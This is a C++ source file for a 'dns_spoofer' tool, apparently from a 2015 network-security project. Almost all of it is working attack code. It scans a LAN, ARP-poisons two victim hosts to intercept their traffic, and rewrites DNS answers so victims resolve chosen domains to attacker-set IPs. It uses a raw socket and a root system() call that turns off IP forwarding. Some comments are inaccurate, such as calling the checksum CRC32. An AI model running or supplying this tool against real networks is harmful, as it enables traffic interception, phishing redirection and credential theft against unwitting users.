/* ========================================================================
   $SOURCE FILE
   $File: main.cpp $
   $Program: dns_spoofer$
   $Developer: Jordan Marling $
   $Created On: 2015/10/27 $
   $Functions: $
   void Usage(const char *name);
   void ListInterfaces();
   void SpoofDNS(const char *interface, DNSConfig config, char *mac_addr1, char *mac_addr2);
   uint16_t Checksum(uint16_t *buffer, uint16_t len);
   int main(int argc, char **argv)

   $Description: This program can do three things:
   1. It can scan for all computers on a network and return their IP addresses
   and MAC addresses.
   2. It can perform a man in the middle attack on two machines to route all
   traffic through the attacking machine.
   3. It can spoof DNS responses to point the victim machines to a different
   IP address.

   $Revisions: $
   ======================================================================== */

#include <arpa/inet.h>
#include <getopt.h>
#include <linux/if.h>
#include <linux/if_packet.h>
#include <memory.h>
#include <netdb.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "arp.h"
#include "config_reader.h"
#include "dns.h"
#include "scan.h"
#include "interface.h"

enum program_path
{
    PROG_INTERFACES = 0x1,
    PROG_SCAN = 0x2,
    PROG_SPOOF = 0x4,
    PROG_MITM = 0x8,
};
struct UDPPseudoHeader
{
    uint32_t saddr;
    uint32_t daddr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t len;
};
struct address_spoof
{
    char *Address;
    uint32_t AddressLen;
    uint32_t IP;
};

void Usage(const char *name);
void ListInterfaces();
void SpoofDNS(const char *interface, DNSConfig config, char *mac_addr1, char *mac_addr2);
uint16_t Checksum(uint16_t *buffer, uint16_t len);

/* ========================================================================
   $ FUNCTION
   $ Name: main $
   $ Prototype: int main(int argc, char **argv) $
   $ Params: 
   $    argc: The amount of arguments $
   $    argv: The arguments $
   $ Description: This is the main entrypoint to the application. The
   only logic it does is to collect parameters and call
   the associated function.s
   ======================================================================== */
int main(int argc, char **argv)
{
    int opt, opt_index = 0;
    struct option option_args[] = {
        { "help", no_argument, 0, 'h' },
        { "scan", required_argument, 0, 's' },
        { "if-list", no_argument, 0, 'l' },
        { "interface", required_argument, 0, 'i' },
        { "config", required_argument, 0, 'c' },
        { "mitm", no_argument, 0, 'm' },
    };
    uint32_t path = 0x00;
    char *interface = 0;
    int iface_count;
    char *netmask;
    char *configfile;

    char *addr1;
    char *addr2;
    uint32_t ip_addr1;
    uint32_t ip_addr2;
    char mac_addr1[6];
    char mac_addr2[6];

    // Check that we are root
    if (getuid() != 0 || getgid() != 0)
    {
        printf("You must be root to run this application.\n");
        return 1;
    }

    while ((opt = getopt_long(argc, argv, "hs:li:c:m", option_args, &opt_index)) != -1)
    {
        switch(opt)
        {
            case 'h':
            {
                Usage(argv[0]);
                return 0;
            } break;

            case 's':
            {
                netmask = optarg;
                path |= PROG_SCAN;
            } break;

            case 'l':
            {
                path |= PROG_INTERFACES;
            } break;

            case 'i':
            {
                interface = optarg;
            } break;

            case 'c':
            {
                configfile = optarg;
                path |= PROG_SPOOF;
            } break;

            case 'm':
            {
                path |= PROG_MITM;
            } break;

        }
    }

    if ((path & PROG_INTERFACES) != 0)
    {
        ListInterfaces();
        return 0;
    }

    // If an interface was not specified, try to find one
    if (interface == 0)
    {
        // If there are multiple, try to use the first one found, but notify the user
        if ((iface_count = GetFirstInterface(&interface)) != 1)
        {
            printf("Using the first interface found out of %d: %s\n", iface_count, interface);
        }
    }

    if ((path & PROG_SCAN) != 0)
    {
        ScanNetwork(interface, netmask);
        return 0;
    }

    if (argc < optind + 1)
    {
        Usage(argv[0]);
        return 1;
    }

    addr1 = argv[optind++];
    addr2 = argv[optind];

    // Parse IP addresses into 32 bit ints.
    uint32_t first, second, third, fourth;
    if (sscanf(addr1, "%d.%d.%d.%d", &first, &second, &third, &fourth) != 4)
    {
        printf("The arguments of the man in the middle attack must be valid IP addresses.\n");
        return 1;
    }
    if (first > 255 || second > 255 || third > 255 || fourth > 255)
    {
        printf("The arguments of the man in the middle attack must be valid IP addresses.\n");
        return 1;
    }
    ip_addr1 = (first << 24) | (second << 16) | (third << 8) | (fourth);

    if (sscanf(addr2, "%d.%d.%d.%d", &first, &second, &third, &fourth) != 4)
    {
        printf("The arguments of the man in the middle attack must be valid IP addresses.\n");
        return 1;
    }
    if (first > 255 || second > 255 || third > 255 || fourth > 255)
    {
        printf("The arguments of the man in the middle attack must be valid IP addresses.\n");
        return 1;
    }
    ip_addr2 = (first << 24) | (second << 16) | (third << 8) | (fourth);

    // Lookup MAC addresses
    ArpResolveIP(interface, ip_addr1, mac_addr1);
    ArpResolveIP(interface, ip_addr2, mac_addr2);

    // Man in the middle
    if ((path & PROG_MITM) != 0)
    {
        ArpPoison *poison = (ArpPoison*)malloc(sizeof(ArpPoison) * 2);

        // Set the target IP addresses.
        poison[0].SpoofIP = ip_addr2;
        poison[0].TargetIP = ip_addr1;
        memcpy(poison[0].TargetMAC, mac_addr1, 6);

        poison[1].SpoofIP = ip_addr1;
        poison[1].TargetIP = ip_addr2;
        memcpy(poison[1].TargetMAC, mac_addr2, 6);

        // This call will do a man in the middle attack until the
        // child is killed or application has exited.
        ArpStartPoisoning(interface, poison, 2);
    }

    // DNS Spoofing
    if ((path & PROG_SPOOF) != 0)
    {
        DNSConfig config = {0};
        if (ConfigRead(configfile, &config) != 0)
        {
            return 1;
        }
        SpoofDNS(interface, config, mac_addr1, mac_addr2);
    }

    return 0;
}

/* ========================================================================
   $ FUNCTION
   $ Name: Usage $
   $ Prototype: void Usage(const char *name) $
   $ Params:
   $    name: The name of the program $
   $ Description:  $
   ======================================================================== */
void Usage(const char *name)
{
    printf("%s -h -s <netmask> -l -i <interface> -c <config> -m <Victim IP 1> <Victim IP 2>\n", name);
    printf("\t -h --help: Displays this message.\n");
    printf("\t -s --scan: Scans the for all computers with the specified netmask. Ex: 192.168.0.0/24\n");
    printf("\t -l --if-list: Prints a list of all of the interfaces on the computer.\n");
    printf("\t -i --interface: Specifies an interface for the application to use. If this parameter is not specified, the first one on the list will be chosen.\n");
    printf("\t -c --config: Specifies the config file for the DNS spoof.\n");
    printf("\t -m --mitm: Performs a man in the middle attack as well as the DNS spoof.\n");
}

/* ========================================================================
   $ FUNCTION
   $ Name: SpoofDNS $
   $ Prototype: void SpoofDNS(const char *interface, DNSConfig config) $
   $ Params:
   $    interface: The interface to spoof on $
   $    config: The DNSConfig to say who the targets are and the DNS spoofs. $
   $    mac_addr1: The first victims mac address $
   $    mac_addr2: The second victims mac address $
   $ Description:  $
   ======================================================================== */
void SpoofDNS(const char *interface, DNSConfig config, char *mac_addr1, char *mac_addr2)
{
    DNSSpoof *spoof;
    int sd;
    int spoof_index = 0;
    address_spoof *spoofs = (address_spoof*)malloc(sizeof(address_spoof) * config.num_spoofs);

    spoof = config.SpoofList;

    // Disable forwarding
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");

    // Create the spoof array
    while (spoof != 0)
    {
        spoofs[spoof_index].AddressLen = spoof->web_addr_len;
        spoofs[spoof_index].Address = spoof->web_address;

        spoofs[spoof_index].IP = htonl(spoof->ip_address);

        spoof_index++;
        spoof = spoof->Next;
    }

    // 1508 is the size of an ethernet frame.
    char buffer[1508];
    int buflen;

    ethhdr *eth_hdr;
    iphdr *ip_hdr;
    udphdr *udp_hdr;

    // Machine information
    char mac[6];
    uint32_t ip;

    struct ifreq ifr;
    struct sockaddr_ll sockaddr = {0};

    if ((sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
    {
        perror("Error opening raw socket.");
        return;
    }

    // Put the interface name into the struct
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);

    // Get our MAC address
    if (ioctl(sd, SIOCGIFHWADDR, &ifr) == -1)
    {
        printf("DNS: Error getting the MAC address.\n");
        return;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    // Get the IP address
    if (ioctl(sd, SIOCGIFADDR, &ifr, sizeof(ifr)) == -1)
    {
        printf("\nError getting the interface index for: %s\n", interface);
        return;
    }

    ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;

    // Set the socket address information
    sockaddr.sll_family = AF_PACKET;
    sockaddr.sll_ifindex = ifr.ifr_ifindex;
    sockaddr.sll_protocol = htons(ETH_P_ALL);
    sockaddr.sll_halen = ETH_ALEN;
    memcpy(sockaddr.sll_addr, mac, 6);

    if (bind(sd, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == -1)
    {
        printf("Error binding to interface.\n");
        return;
    }

    // Loop through and get DNS requests.
    while (1)
    {

        if ((buflen = recvfrom(sd, buffer, sizeof(buffer), 0, 0, 0)) < 0)
        {
            printf("Error reading from interface.\n");
            return;
        }

        // Try to capture DNS responses to change the resolved IP addresses
        eth_hdr = (ethhdr*)buffer;

        // Check to see if the frame is heading to me.
        if (memcmp(eth_hdr->h_dest, mac, 6) != 0)
        {
            continue;
        }

        // Determine who the frame is heading to. If niether of the targets, throw away.
        if (memcmp(eth_hdr->h_source, mac_addr1, 6) == 0)
        {
            memcpy(eth_hdr->h_source, mac, 6);
            memcpy(eth_hdr->h_dest, mac_addr2, 6);
        }
        else if (memcmp(eth_hdr->h_source, mac_addr2, 6) == 0)
        {
            memcpy(eth_hdr->h_source, mac, 6);
            memcpy(eth_hdr->h_dest, mac_addr1, 6);
        }
        else
        {
            continue;
        }

        if (ntohs(eth_hdr->h_proto) == ETH_P_IP)
        {
            ip_hdr = (iphdr*)((char*)eth_hdr + ETH_HLEN);

            // If the IP packet is actually for me, don't forward it.
            if (ip == ip_hdr->saddr || ip == ip_hdr->daddr)
            {
                continue;
            }

            if (ip_hdr->protocol == IPPROTO_UDP)
            {
                udp_hdr = (udphdr*)((char*)ip_hdr + (ip_hdr->ihl * 4));

                if (ntohs(udp_hdr->source) == 53)
                {
                    char *udp_payload = ((char*)udp_hdr) + sizeof(udp_hdr);
                    uint16_t udp_len = ntohs(udp_hdr->len) - sizeof(udp_hdr);
                    DNS response;

                    if (DNSParse(udp_payload, udp_len, &response) == -1)
                    {
                        printf("Error parsing dns.");
                        continue;
                    }

                    int break_out = 0;

                    for(int j = 0; j < response.AnswerCount; j++)
                    {
                        if (response.Answers[j].Type != 0x0001)
                        {
                            // printf("Type: %x\n", response.Answers[j].Type);
                            break_out = 1;
                            break;
                        }

                        for(int i = 0; i < (int)config.num_spoofs; i++)
                        {
                            // printf("Checking: '%s' against '%s'\n", response.Answers[j].Name, spoofs[i].Address);
                            if (strcmp(response.Answers[j].Name, spoofs[i].Address) == 0)
                            {
                                // printf("replacing %s\n", response.Answers[j].Name);
                                memcpy(response.Answers[j].RData, &spoofs[i].IP, 4);
                                break;
                            }
                        }
                    }

                    if (break_out == 0 && response.AuthorityCount == 0 && response.AdditionalCount == 0)
                    {

                        DNSCreate(&response, udp_payload);

                        // Recalculate UDP checksum
                        UDPPseudoHeader udp_psuedo_header;
                        char *pseudogram;
                        uint16_t pseudogram_size;

                        udp_hdr->check = 0;

                        // Setup UDP Pseudo Header
                        udp_psuedo_header.saddr = ip_hdr->saddr;
                        udp_psuedo_header.daddr = ip_hdr->daddr;
                        udp_psuedo_header.placeholder = 0;
                        udp_psuedo_header.protocol = IPPROTO_UDP;
                        udp_psuedo_header.len = htons(sizeof(udphdr) + udp_len);

                        pseudogram_size = sizeof(udp_psuedo_header) + sizeof(udphdr) + udp_len;
                        pseudogram = (char*)malloc(pseudogram_size);
                        memcpy(pseudogram, (char*)&udp_psuedo_header, sizeof(udp_psuedo_header));
                        memcpy(pseudogram + sizeof(udp_psuedo_header), udp_hdr, sizeof(udphdr) + udp_len);

                        udp_hdr->check = Checksum((uint16_t*)pseudogram, pseudogram_size);
                    }
                }
            }
        }

        if (write(sd, buffer, buflen) < 0)
        {
            perror("write");
            printf("Error forwarding ethernet frame.\n");
            return;
        }
    }
}


/* ========================================================================
   $ FUNCTION
   $ Name: Checksum $
   $ Prototype: uint16_t Checksum(uint16_t *buffer, uint16_t len) $
   $ Params: 
   $    buffer: The buffer to perform the checksum on $
   $    len: The length of the buffer $
   $ Description: Calculates the CRC32 checksum of the buffer $
   ======================================================================== */
uint16_t Checksum(uint16_t *buffer, uint16_t len)
{
    long sum;
    unsigned short oddbyte;
    short checksum;

    sum = 0;
    while (len > 1) {
        sum += *buffer++;
        len -= 2;
    }
    if (len == 1) {
        oddbyte = 0;
        *((char*)&oddbyte) = *(char*)buffer;
        sum += oddbyte;
    }

    sum = (sum>>16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    checksum = (uint16_t)~sum;

    return checksum;
}
